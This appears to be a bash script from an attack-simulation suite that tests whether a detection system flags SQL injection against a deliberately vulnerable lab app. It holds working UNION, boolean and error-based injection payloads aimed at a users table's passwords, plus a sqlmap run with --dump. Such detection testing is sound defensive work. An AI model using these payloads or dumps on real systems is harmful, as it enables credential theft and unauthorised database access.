#!/usr/bin/env bash
# =============================================================================
# 07 — SQL Injection Attack
# Tool: sqlmap
# SSS should detect: sql_injection pattern via XGBoost classifier
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "07_sqli_attack"

VULN_PORT="${VULN_APP_PORT:-8888}"
TARGET_URL="http://${TARGET_IP}:${VULN_PORT}/search?q=test"
SQLMAP_OUTPUT="/tmp/sqlmap_output"

echo "[*] Verifying VulnApp is reachable..."
if ! curl -sf "http://${TARGET_IP}:${VULN_PORT}/health" >/dev/null 2>&1; then
    record_result "false" "VulnApp not reachable on port ${VULN_PORT}." ""
    exit 0
fi

# ---------------------------------------------------------------------------
# Phase 1: Manual SQL injection probes (quick verification)
# ---------------------------------------------------------------------------
echo "[*] Phase 1: Manual SQL injection probes..."
manual_success=false

# Classic UNION-based injection
union_payload="' UNION SELECT 1,username,password,role FROM users--"
union_response=$(curl -s --max-time 10 \
    "http://${TARGET_IP}:${VULN_PORT}/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"${union_payload}\"))")" \
    2>/dev/null) || union_response=""

if echo "${union_response}" | grep -qi "admin123\|password\|sentinel"; then
    echo "  [+] UNION injection succeeded — user data extracted!"
    manual_success=true
    manual_evidence="UNION injection extracted user credentials from database."
fi

# Boolean-based injection
bool_payload="' OR '1'='1"
bool_response=$(curl -s --max-time 10 \
    "http://${TARGET_IP}:${VULN_PORT}/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"${bool_payload}\"))")" \
    2>/dev/null) || bool_response=""

if echo "${bool_response}" | grep -qi "Firewall Appliance\|VPN Gateway"; then
    echo "  [+] Boolean injection succeeded — all records returned!"
    manual_success=true
    manual_evidence="${manual_evidence:-}Boolean injection returned all database records."
fi

# Error-based injection
error_payload="' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--"
error_response=$(curl -s --max-time 10 \
    "http://${TARGET_IP}:${VULN_PORT}/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"${error_payload}\"))")" \
    2>/dev/null) || error_response=""

# ---------------------------------------------------------------------------
# Phase 2: sqlmap automated scan
# ---------------------------------------------------------------------------
echo "[*] Phase 2: Running sqlmap automated scan..."
rm -rf "${SQLMAP_OUTPUT}"

sqlmap_result=$(timeout "${ATTACK_TIMEOUT}" \
    sqlmap -u "${TARGET_URL}" \
    --batch \
    --level=3 \
    --risk=2 \
    --technique=BEUS \
    --output-dir="${SQLMAP_OUTPUT}" \
    --dump \
    --threads=4 \
    2>&1) || true

# Check sqlmap results
tables_dumped=$(echo "${sqlmap_result}" | grep -c "Database:" || true)
injectable=$(echo "${sqlmap_result}" | grep -c "is vulnerable" || true)

if ${manual_success}; then
    evidence="${manual_evidence}"
    record_result "true" "${evidence}" "${sqlmap_result}"
elif [[ "${injectable}" -gt 0 ]] || [[ "${tables_dumped}" -gt 0 ]]; then
    evidence="sqlmap confirmed SQL injection vulnerability. Tables dumped: ${tables_dumped}."
    record_result "true" "${evidence}" "${sqlmap_result}"
else
    blocked=$(echo "${sqlmap_result}" | grep -ciE "connection refused|blocked|reset|WAF" || true)
    if [[ "${blocked}" -gt 0 ]]; then
        evidence="SQL injection attempts were blocked/filtered."
        record_result "false" "${evidence}" "${sqlmap_result}"
    else
        evidence="sqlmap could not confirm injection (target may be protected)."
        record_result "false" "${evidence}" "${sqlmap_result}"
    fi
fi

rm -rf "${SQLMAP_OUTPUT}"
